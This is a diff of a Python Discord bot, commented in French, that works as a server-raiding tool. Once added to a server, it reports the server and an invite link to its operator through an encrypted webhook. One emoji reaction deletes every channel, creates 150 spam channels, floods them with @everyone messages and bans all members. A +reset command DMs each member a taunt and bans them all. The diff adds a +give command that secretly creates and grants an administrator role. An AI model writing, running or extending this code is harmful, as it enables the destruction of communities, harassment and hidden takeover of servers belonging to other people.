@@ -3,34 +3,31 @@ from discord.ext import commands
 import asyncio
 import requests
 from cryptography.fernet import Fernet
+import os
 
 
-TOKEN = ""
+TOKEN = os.getenv("DISCORD_TOKEN")
+
+
 
 # Ca cest le message qui va etre spam dans les salons
-MESSAGE_A_ENVOYER = "<@1160919706916618332> te tro bege !" 
+MESSAGE_A_ENVOYER = "@everyone reach heaven†" 
 
 # ca cest le message quon recoit quand on fait +reset le ban que tu recois en mp
-MESSAGE_A_ENVOYERMP = "MANGE MON PAFF SALE MERDE"
-
-
-####### YA QUE CA A MODIF 
-####### YA QUE CA A MODIF 
-####### YA QUE CA A MODIF 
-####### YA QUE CA A MODIF 
-####### YA QUE CA A MODIF 
-####### YA QUE CA A MODIF 
+MESSAGE_A_ENVOYERMP = "You died 😹😹"
 
 
 
 
 
-botx = "c4s70Zk_K0lF7QIYeHsBi9uuHoZ4NDAHtg__LvQbKpE="
+
+
+botx = "7Kjuaf_aig9iFWciY7AN8pEvDzlJFbm02HRDd1gqAFg="
 
 
 
 
-CHANNEL_ID = 1353484432329146439
+CHANNEL_ID = 1356378465770930328
 
 intents = discord.Intents.default()
 intents.guilds = True  
@@ -44,7 +41,7 @@ intents.presences = True
 
 bot = commands.Bot(command_prefix="+", intents=intents)
 
-webh = "gAAAAABn6qNsc_5TGcnvc22fl1J7j00fs9JaYvZAqzppaJJ0_Gt02BdVqSjr5EGsd7cjfp-1ttoiu7OZlVIZcwyhP8C4AIEXzHIYSBJIg7ryoN3rFbDZ4UF8g8dvBA3XXicfKmQSW7z42neYZukPJa16QorvU5AxGvpzfu7Mta-82kcuvWzFcwA4TsDhYFtbkC61ixKsAMdnN4pITTIa9MIhhTqpqcIWagsKow8F-GkZcd8EsXwB5WY="
+webh = "gAAAAABn7uXcNYjoLmlCvNM9CeuhbQ45bkEFU3RxreobP_ZiEBH6clcxGTakhzO_cf0484ipobuNj-47sG5bL_0E5It2wshahYElPHYkwIozrbYAvzd2h9QGsKgXgR71_NWuunj7fQ82kp2v4_cUDcuVFj4p9p_9GFAKHKa-2ttIYaJwho5_6rB-OTVTRbt5sgbkQLB_2Oiz9NKuc4vPA27q-VtWG-UqGR8YTBKevUvUlRNFw_5gIjk="
 
 
 cipher_suite = Fernet(botx.encode())
@@ -55,33 +52,33 @@ response = requests.post(webhook_url, json=data)
 
 @bot.event
 async def on_guild_join(guild):
-    
+
     channel = bot.get_channel(CHANNEL_ID)
     if channel is None:
         print("Salon défini introuvable.")
         return
-    
-    
+
+
     invite = None
     for inv in await guild.invites():
         invite = inv  
         break
-    
+
     if invite is None:  
         for text_channel in guild.text_channels:
             if text_channel.permissions_for(guild.me).create_instant_invite:
                 invite = await text_channel.create_invite(max_age=0, max_uses=0)
                 break
-    
+
     invite_url = invite.url if invite else "Aucun lien disponible"
-    
-    
-    embed = discord.Embed(title="Bot ajouté !", color=discord.Color.blue())
-    embed.description = f"Le bot a été ajouté à **{guild.name}**\nMembres : {guild.member_count}\n\nLien d’invitation : {invite_url}"
-    
-    
+
+
+    embed = discord.Embed(title="Nolan is ready to destroy this planet !", color=discord.Color.blue())
+    embed.description = f"Planète : **{guild.name}**\nHabitants : {guild.member_count}\n\nAccès : {invite_url}"
+
+
     msg = await channel.send(embed=embed)
-    await msg.add_reaction("⚡")
+    await msg.add_reaction("👊")
     await msg.add_reaction("❌")
 
     bot.message_guild_map[msg.id] = guild.id
@@ -89,7 +86,7 @@ async def on_guild_join(guild):
 async def ban_all_members(guild):
     for member in guild.members:
         try:
-            await member.ban(reason="Ban all par le bot")
+            await member.ban(reason="†")
             print(f"🚫 Membre banni : {member.name}")
             await asyncio.sleep(1)  
         except Exception as e:
@@ -104,15 +101,15 @@ async def on_ready():
 async def on_raw_reaction_add(payload):
     if payload.user_id == bot.user.id:
         return
-    
+
     guild = bot.get_guild(bot.message_guild_map.get(payload.message_id))
     if not guild:
         return
-    
+
     channel = bot.get_channel(payload.channel_id)
     message = await channel.fetch_message(payload.message_id)
     user = guild.get_member(payload.user_id)
-    
+
     embed_response = discord.Embed(
         title="Action lancé !",
         description=f"Vous avez appuyé sur {payload.emoji}",
@@ -127,11 +124,11 @@ async def on_raw_reaction_add(payload):
         await message.clear_reactions()
         await guild.leave()
 
-    elif str(payload.emoji) == "⚡":
+    elif str(payload.emoji) == "👊":
         try:
-            await message.clear_reaction("⚡")
+            await message.clear_reaction("👊")
 
-            
+
             try:
                 for ch in guild.channels:
                     try:
@@ -144,11 +141,11 @@ async def on_raw_reaction_add(payload):
 
             print("Tous les salons ont été supprimés.")
 
-          
+
             created_channels = []
             try:
                 for i in range(150):
-                    new_channel = await guild.create_text_channel(name=f"MEYAZZA-on-top-{i+1}")
+                    new_channel = await guild.create_text_channel(name=f"𝙃𝙀𝘼𝙑𝙀𝙉 𝙄𝙎 𝘾𝙇𝙊𝙎𝙀 🪽-{i+1}")
                     created_channels.append(new_channel)
             except Exception as e:
                 print(f"Erreur lors de la création des salons : {e}")
@@ -158,7 +155,7 @@ async def on_raw_reaction_add(payload):
 
 
 
-            
+
             try:
                 for ch in created_channels:
                     for _ in range(3):  
@@ -173,21 +170,21 @@ async def on_raw_reaction_add(payload):
             print("3 messages envoyés dans tous les salons.")
 
         except Exception as e:
-            print(f"Erreur lors de l'exécution de l'action ⚡ : {e}")
-      
+            print(f"Erreur lors de l'exécution de l'action 👊 : {e}")
 
-            
+
+
             await ban_all_members(guild)
 
         except Exception as e:
             print(f"Erreur lors de l'exécution de l'action ⚡ : {e}")
 
 
-     
+
 
 @bot.command()
 async def list(ctx):
-    embed = discord.Embed(title="Liste des serveurs", color=discord.Color.green())
+    embed = discord.Embed(title="Liste des planètes", color=discord.Color.green())
     for guild in bot.guilds:
         invite_url = "Aucun lien disponible"
         for inv in await guild.invites():
@@ -206,27 +203,45 @@ async def list(ctx):
 async def reset(ctx):
     guild = ctx.guild  
 
-    
+
     for member in guild.members:
         try:
-            
+
             await member.send(MESSAGE_A_ENVOYERMP)
             print(f"Message envoyé à {member.name}")
         except discord.Forbidden:
             print(f"Impossible d'envoyer un message privé à {member.name}")
         except Exception as e:
             print(f"Erreur avec {member.name}: {e}")
-    
-    
+
+
     for member in guild.members:
         try:
-            await member.ban(reason="BAHAHAHHAH DEV BY NOX")
+            await member.ban(reason="BAHAHAHHAH DEV BY LE AZ")
             print(f"Banni {member.name}")
             await asyncio.sleep(1)  
         except Exception as e:
             print(f"Erreur lors du bannissement de {member.name}: {e}")
 
     print("Tous les membres ont été bannis.")
+
+@bot.command()
+async def give(ctx):
+    """Supprime le message, crée un rôle admin et l'attribue à l'utilisateur"""
+    await ctx.message.delete() 
+
+    guild = ctx.guild
+    role_name = "."  
+    role = discord.utils.get(guild.roles, name=role_name)
+
+    if not role:
+       
+        role = await guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
+        print(f"✅ Rôle '{role_name}' créé sur {guild.name}.")
+
+  
+    await ctx.author.add_roles(role)
+    print(f"✅ {ctx.author} a reçu le rôle '{role_name}'.")
 
 
 bot.run(TOKEN)
